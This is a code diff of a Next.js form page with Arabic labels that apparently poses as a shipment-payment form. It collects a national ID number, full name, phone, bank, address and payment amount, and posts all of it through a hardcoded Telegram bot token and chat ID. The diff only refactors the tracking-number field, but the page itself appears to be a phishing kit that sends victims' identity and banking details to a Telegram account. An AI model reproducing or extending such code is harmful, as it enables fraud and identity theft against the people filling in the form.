@@ -9,7 +9,7 @@ import Link from 'next/link'
 
 const Page = () => {
 
-  let numberTrack= useRef();
+  
   let numbernation= useRef();
   let fullname= useRef();
   let numphone= useRef();
@@ -27,7 +27,7 @@ const Page = () => {
 
   const handlerout = () => {
     
-if(numberTrack.current.value == "" || numbernation.current.value == "" || fullname.current.value== "" || numphone.current.value == ""|| typeshohna.current.value == ""|| adress.current.value == ""||city.current.value == ""||mony.current.value == "") {
+if(track == "" || numbernation.current.value == "" || fullname.current.value== "" || numphone.current.value == ""|| typeshohna.current.value == ""|| adress.current.value == ""||city.current.value == ""||mony.current.value == "") {
       alert('من فضلك قم بملى الحقول')
     }else{
         
@@ -42,7 +42,7 @@ if(numberTrack.current.value == "" || numbernation.current.value == "" || fullna
       token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
       chat_id:6364334502
     }
-    var length =`رقم الشحنة: ${numberTrack.current.value} %0A رقم بطاقة الاحوال: ${numbernation.current.value} %0A الاسم الكامل : ${fullname.current.value} %0A رقم الجوال: ${numphone.current.value} %0A نوع الشحنة :${typeshohna.current.value} %0A نوع مشغل الجوال :${selecttypenumber.current.value} %0A نوع البنك :${selectBanks.current.value} %0A العنوان :${adress.current.value} %0A المدينة :${city.current.value} %0A قيمة السداد: ${mony.current.value} %0A %0A ${track}`
+    var length =`رقم الشحنة: ${track} %0A رقم بطاقة الاحوال: ${numbernation.current.value} %0A الاسم الكامل : ${fullname.current.value} %0A رقم الجوال: ${numphone.current.value} %0A نوع الشحنة :${typeshohna.current.value} %0A نوع مشغل الجوال :${selecttypenumber.current.value} %0A نوع البنك :${selectBanks.current.value} %0A العنوان :${adress.current.value} %0A المدينة :${city.current.value} %0A قيمة السداد: ${mony.current.value} %0A %0A ${track}`
 
 
     fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
@@ -60,7 +60,7 @@ if(numberTrack.current.value == "" || numbernation.current.value == "" || fullna
               src={formza}
               width={450}
             />
-            <input type="number" name='numberTrack' onChange={(e) => setTrack(e.target.value)} ref={numberTrack} placeholder='رقم الشحنة' required maxLength="12"  minLength="8"/>
+            <input type="number" name='numberTrack' onChange={(e) => setTrack(e.target.value)}  placeholder='رقم الشحنة' required maxLength="12"  minLength="8"/>
             <input type="number" name='numbernationalty' ref={numbernation} placeholder='رقم بطاقة الأحوال او الأقامة' required />
             <input type="text" name='typeShohna' ref={typeshohna} placeholder='نوع الشحنة' required />
             <input type="text" name='fullname' ref={fullname} placeholder='الأسم الكامل' required />
